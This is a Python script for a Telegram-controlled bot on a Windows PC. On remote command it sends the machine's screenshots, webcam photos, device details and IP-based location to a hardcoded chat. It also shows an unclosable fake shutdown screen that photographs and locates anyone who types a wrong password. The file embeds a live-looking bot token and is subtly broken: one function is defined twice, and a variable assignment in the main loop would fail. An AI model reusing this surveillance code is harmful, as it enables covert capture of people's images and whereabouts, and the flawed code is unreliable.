# app.py  - Full feature bot with hardened fake-shutdown screen
# WARNING: read comments about safety and how to exit if needed.

import os
import platform
import socket
import psutil
import requests
import pyautogui
import cv2
import ctypes
import tkinter as tk
import threading
import time
import json
import urllib.request
from datetime import datetime
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ---------------- CONFIG ----------------
BOT_TOKEN = "8048643797:AAHT2295nUpvdcSsaZJ_IrLns1cgaLTpUX4"   # provided earlier
CHAT_ID = "1338095869"
URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# Secret password to close fake screen locally
CORRECT_PASSWORD = "1234"

# Optional: set to True to call BlockInput (DANGEROUS) - not recommended
# If you enable this, you must be prepared to kill python process from Task Manager.
USE_BLOCK_INPUT = False

# ---------- Reliable HTTP session ----------
session = requests.Session()
retries = Retry(total=3, backoff_factor=1, status_forcelist=(429,500,502,503,504))
session.mount("https://", HTTPAdapter(max_retries=retries))

# ---------- Globals ----------
sim_status = "No changes detected"
_fake_thread = None
_fake_stop_event = threading.Event()
_fake_lock = threading.Lock()
_fake_active = False

# Intruder tracking
MAX_FAILED_ATTEMPTS = 3

# ---------- Helper funcs: Telegram ----------
def send_message(chat_id, text):
    try:
        session.post(f"{URL}/sendMessage", data={"chat_id": chat_id, "text": text}, timeout=15)
    except Exception as e:
        print("send_message err:", e)

def send_document(chat_id, file_path, caption=None):
    try:
        with open(file_path, "rb") as f:
            files = {"document": (os.path.basename(file_path), f)}
            data = {"chat_id": chat_id}
            if caption:
                data["caption"] = caption
            session.post(f"{URL}/sendDocument", data=data, files=files, timeout=120)
    except Exception as e:
        print("send_document err:", e)

# ---------- System features ----------
def get_device_info():
    try:
        model = platform.node()
        os_info = f"{platform.system()} {platform.release()}"
        cpu = platform.processor() or "Unknown"
        ram = f"{round(psutil.virtual_memory().total / (1024**3),2)} GB"
        try:
            batt = psutil.sensors_battery()
            battery = f"{batt.percent}%" if batt else "Unknown"
        except Exception:
            battery = "Unknown"
        hostname = socket.gethostname()
        local_ip = "Unknown"
        try:
            local_ip = socket.gethostbyname(hostname)
        except:
            pass
        try:
            public_ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
        except:
            public_ip = "Unknown"
        return (f"Model/Name: {model}\nOS: {os_info}\nCPU: {cpu}\nRAM: {ram}\n"
                f"Battery: {battery}\nLocal IP: {local_ip}\nPublic IP: {public_ip}")
    except Exception as e:
        return f"Error getting device info: {e}"

def beep_alarm():
    try:
        import winsound
        winsound.Beep(1000, 800)
    except Exception:
        # fallback
        print("\a")

def take_screenshot():
    path = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
    try:
        pyautogui.screenshot(path)
        return path
    except Exception as e:
        print("screenshot err:", e)
        return None

def capture_camera(camera_index=0):
    path = None
    try:
        # On Windows use CAP_DSHOW to reduce delay
        cam = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW) if os.name == "nt" else cv2.VideoCapture(camera_index)
        time.sleep(0.2)  # small warm-up
        if not cam.isOpened():
            try:
                cam.release()
            except:
                pass
            return None
        ret, frame = cam.read()
        cam.release()
        if not ret or frame is None:
            return None
        path = f"camera_{camera_index}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        cv2.imwrite(path, frame)
        return path
    except Exception as e:
        print("camera err:", e)
        try:
            cam.release()
        except:
            pass
        return None

def lock_system():
    try:
        ctypes.windll.user32.LockWorkStation()
        return True
    except Exception as e:
        print("lock err:", e)
        return False

# Improved location
def get_location():
    try:
        r = session.get("https://ipinfo.io/json", timeout=6)
        info = r.json()
        loc = info.get("loc", "?,?")
        lat, lon = (loc.split(",") + ["?","?"])[:2]
        city = info.get("city", "Unknown")
        region = info.get("region", "Unknown")
        country = info.get("country", "Unknown")
        org = info.get("org", "Unknown")
        ip = info.get("ip", "Unknown")
        maps = f"https://www.google.com/maps?q={lat},{lon}" if lat != "?" else "N/A"
        return (f"📍 Location Info:\nLatitude: {lat}\nLongitude: {lon}\nCity: {city}\nRegion: {region}\n"
                f"Country: {country}\nISP/Org: {org}\nIP: {ip}\nGoogle Maps: {maps}")
    except Exception as e:
        print("location err:", e)
        return f"Error getting location: {e}"

# ---------- Backup (simulated) ----------
def backup_contacts():
    path = f"contacts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    contacts = [{"Name":"Alice","Number":"111"},{"Name":"Bob","Number":"222"}]
    with open(path, "w", encoding="utf-8") as f:
        f.write("Name,Number\n")
        for c in contacts:
            f.write(f"{c['Name']},{c['Number']}\n")
    return path

def backup_call_logs():
    path = f"calllogs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    logs = [{"Name":"Alice","Number":"111","Type":"Incoming","Duration":"1:23"}]
    with open(path, "w", encoding="utf-8") as f:
        f.write("Name,Number,Type,Duration\n")
        for l in logs:
            f.write(f"{l['Name']},{l['Number']},{l['Type']},{l['Duration']}\n")
    return path

def backup_browser_data():
    path = f"browser_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    data = {"bookmarks":[{"title":"Google","url":"https://google.com"}]}
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)
    return path

# ---------- Fake-shutdown GUI thread ----------
def _force_foreground(hwnd):
    """Attempt to force window to foreground/topmost (Windows only)."""
    try:
        user32 = ctypes.windll.user32
        SWP_NOSIZE = 0x0001
        SWP_NOMOVE = 0x0002
        HWND_TOPMOST = -1
        user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE)
        user32.SetForegroundWindow(hwnd)
    except Exception as e:
        # ignore on non-windows or if fails
        pass

def _fake_window_thread(stop_event: threading.Event):
    """
    Fullscreen undecorated topmost Tk window.
    - Provides hidden password entry (press Enter to submit).
    - On wrong attempt: capture photo and send + location.
    - Periodically forces itself foreground.
    The stop_event is used to close the window from the bot.
    """
    try:
        root = tk.Tk()
        root.overrideredirect(True)          # remove titlebar
        root.attributes("-fullscreen", True)
        root.attributes("-topmost", True)
        root.config(bg="black")

        # prevent close via WM_DELETE_WINDOW
        root.protocol("WM_DELETE_WINDOW", lambda: None)

        # Message + hidden entry
        label = tk.Label(root, text="Powering off...", fg="white", bg="black", font=("Segoe UI", 36))
        label.pack(expand=True)

        entry_var = tk.StringVar()
        entry = tk.Entry(root, show="*", textvariable=entry_var, font=("Segoe UI", 18), justify="center")
        entry.pack(pady=10)
        entry.focus_set()

        local_failed = 0

        def check_password(event=None):
            nonlocal local_failed
            pwd = entry_var.get().strip()
            entry_var.set("")
            if pwd == CORRECT_PASSWORD:
                stop_event.set()
                return
            # wrong password: capture and send
            local_failed += 1
            img = capture_camera(0)
            if img:
                send_document(CHAT_ID, img, caption=f"Intruder photo (attempt {local_failed})")
                try: os.remove(img)
                except: pass
            send_message(CHAT_ID, f"Intruder attempt #{local_failed}. {get_location()}")
            if local_failed >= MAX_FAILED_ATTEMPTS:
                local_failed = 0

        entry.bind("<Return>", check_password)

        # Optionally call BlockInput (dangerous) if user explicitly set flag - commented by default
        if USE_BLOCK_INPUT:
            try:
                ctypes.windll.user32.BlockInput(True)
            except Exception as e:
                print("BlockInput failed:", e)

        def poll():
            # force foreground and check stop event
            try:
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                # set to topmost repeatedly
                _force_foreground(int(root.winfo_id()))
            except Exception:
                pass
            if stop_event.is_set():
                try:
                    if USE_BLOCK_INPUT:
                        try:
                            ctypes.windll.user32.BlockInput(False)
                        except:
                            pass
                    root.destroy()
                except:
                    pass
                return
            root.after(300, poll)

        root.after(300, poll)
        root.mainloop()
    except Exception as e:
        print("Fake window thread error:", e)
    finally:
        stop_event.clear()
        # ensure BlockInput released if used
        if USE_BLOCK_INPUT:
            try:
                ctypes.windll.user32.BlockInput(False)
            except:
                pass

def start_fake_shutdown():
    global _fake_thread, _fake_stop_event, _fake_active
    with _fake_lock:
        if _fake_thread and _fake_thread.is_alive():
            return False
        _fake_stop_event.clear()
        _fake_thread = threading.Thread(target=_fake_window_thread, args=(_fake_stop_event,), daemon=True)
        _fake_thread.start()
        _fake_active = True
        return True

def stop_fake_shutdown():
    global _fake_thread, _fake_stop_event, _fake_active
    with _fake_lock:
        if _fake_thread and _fake_thread.is_alive():
            _fake_stop_event.set()
            _fake_thread.join(timeout=5)
        _fake_active = False
    return True

# ---------- Polling helpers ----------
def clear_webhook():
    try:
        session.post(f"{URL}/deleteWebhook", timeout=8)
    except Exception:
        pass

def get_updates(offset=None, timeout=100):
    params = {"timeout": timeout, "offset": offset}
    resp = session.get(f"{URL}/getUpdates", params=params, timeout=timeout + 10)
    return resp.json()

# ---------- Main loop ----------
def main():
    clear_webhook()
    last_update = None
    print("Bot started, listening for commands...")

    while True:
        try:
            updates = get_updates(last_update)
        except Exception as e:
            print("getUpdates error:", e)
            time.sleep(3)
            continue

        if not updates or not isinstance(updates, dict):
            time.sleep(0.5)
            continue

        if updates.get("ok"):
            for res in updates.get("result", []):
                last_update = res["update_id"] + 1
                message = res.get("message") or {}
                text = (message.get("text") or "").strip()
                chat = message.get("chat") or {}
                chat_id = str(chat.get("id", ""))

                # only accept commands from configured chat id
                if chat_id != str(CHAT_ID):
                    continue

                cmd = (text or "").lower()
                print("Command:", cmd)

                try:
                    if cmd == "/ping":
                        send_message(CHAT_ID, "Pong ✅")

                    elif cmd == "/beep":
                        beep_alarm()
                        send_message(CHAT_ID, "Beep played ✅")

                    elif cmd == "/device":
                        send_message(CHAT_ID, get_device_info())

                    elif cmd == "/screenshot":
                        p = take_screenshot()
                        if p:
                            send_document(CHAT_ID, p)
                            try: os.remove(p)
                            except: pass
                        else:
                            send_message(CHAT_ID, "Screenshot failed ❌")

                    elif cmd == "/frontcam":
                        p = capture_camera(0)
                        if p:
                            send_document(CHAT_ID, p)
                            try: os.remove(p)
                            except: pass
                        else:
                            send_message(CHAT_ID, "Frontcam failed ❌")

                    elif cmd == "/backcam":
                        p = capture_camera(1)
                        if p:
                            send_document(CHAT_ID, p)
                            try: os.remove(p)
                            except: pass
                        else:
                            send_message(CHAT_ID, "Backcam failed ❌")

                    elif cmd == "/lock":
                        ok = lock_system()
                        send_message(CHAT_ID, "System locked ✅" if ok else "Lock failed ❌")

                    elif cmd == "/sim":
                        send_message(CHAT_ID, f"SIM Status: {sim_status}")

                    elif cmd == "/simchange":
                        sim_status = "SIM Changed!"
                        send_message(CHAT_ID, "SIM changed simulated ⚠️")

                    elif cmd == "/backup":
                        try:
                            files = [backup_contacts(), backup_call_logs(), backup_browser_data()]
                            for fpath in files:
                                send_document(CHAT_ID, fpath)
                                try: os.remove(fpath)
                                except: pass
                            send_message(CHAT_ID, "Backup completed ✅")
                        except Exception as e:
                            send_message(CHAT_ID, f"Backup failed: {e}")

                    elif cmd == "/location":
                        send_message(CHAT_ID, get_location())

                    elif cmd in ("/fakeoff", "/fakeshutdown", "/fakeoffscreen"):
                        started = start_fake_shutdown()
                        if started:
                            send_message(CHAT_ID, ("Fake shutdown started ✅\n"
                                                   "To stop: send /stopfake OR enter the secret password in the UI."))
                        else:
                            send_message(CHAT_ID, "Fake shutdown is already active.")

                    elif cmd in ("/stopfake", "/stopfakeshutdown"):
                        stop_fake_shutdown()
                        send_message(CHAT_ID, "Fake shutdown stopped ✅")

                    else:
                        # unknown command
                        send_message(CHAT_ID, "Unknown command.")

                except Exception as e:
                    print("Command handler error:", e)
                    try:
                        send_message(CHAT_ID, f"Error handling command: {e}")
                    except:
                        pass

        time.sleep(0.3)
def _fake_window_thread(stop_event: threading.Event):
    """
    Fullscreen undecorated topmost Tk window.
    - Hidden password entry (press Enter to exit locally).
    - Captures intruder photo + location on wrong attempt.
    - Periodically forces itself foreground.
    """
    try:
        root = tk.Tk()
        root.overrideredirect(True)  # remove titlebar
        root.config(bg="black")

        # Cross-platform fullscreen handling
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        try:
            if os.name == "nt":  # Windows
                root.attributes("-fullscreen", True)
                root.attributes("-topmost", True)
            else:  # Linux / macOS
                root.geometry(f"{screen_width}x{screen_height}+0+0")
                root.attributes("-topmost", True)
        except tk.TclError:
            root.geometry(f"{screen_width}x{screen_height}+0+0")  # fallback

        # Prevent close via WM_DELETE_WINDOW
        root.protocol("WM_DELETE_WINDOW", lambda: None)

        # Label message
        label = tk.Label(root, text="Powering off...", fg="white", bg="black", font=("Segoe UI", 36))
        label.pack(expand=True)

        # Hidden password entry
        entry_var = tk.StringVar()
        entry = tk.Entry(root, show="*", textvariable=entry_var, font=("Segoe UI", 18), justify="center")
        entry.pack(pady=10)
        entry.focus_set()

        local_failed = 0

        def check_password(event=None):
            nonlocal local_failed
            pwd = entry_var.get().strip()
            entry_var.set("")
            if pwd == CORRECT_PASSWORD:
                stop_event.set()
                return
            local_failed += 1
            img = capture_camera(0)
            if img:
                send_document(CHAT_ID, img, caption=f"Intruder photo (attempt {local_failed})")
                try: os.remove(img)
                except: pass
            send_message(CHAT_ID, f"Intruder attempt #{local_failed}. {get_location()}")
            if local_failed >= MAX_FAILED_ATTEMPTS:
                local_failed = 0

        entry.bind("<Return>", check_password)

        # Optional BlockInput (dangerous)
        if USE_BLOCK_INPUT and os.name == "nt":
            try:
                ctypes.windll.user32.BlockInput(True)
            except Exception as e:
                print("BlockInput failed:", e)

        # Poll: keep foreground + check stop
        def poll():
            try:
                hwnd = int(root.winfo_id())
                _force_foreground(hwnd)
            except Exception:
                pass
            if stop_event.is_set():
                try:
                    if USE_BLOCK_INPUT and os.name == "nt":
                        try:
                            ctypes.windll.user32.BlockInput(False)
                        except:
                            pass
                    root.destroy()
                except:
                    pass
                return
            root.after(200, poll)  # 200ms for more responsiveness

        root.after(200, poll)
        root.mainloop()
    except Exception as e:
        print("Fake window thread error:", e)
    finally:
        stop_event.clear()
        if USE_BLOCK_INPUT and os.name == "nt":
            try:
                ctypes.windll.user32.BlockInput(False)
            except:
                pass

if __name__ == "__main__":
    main()
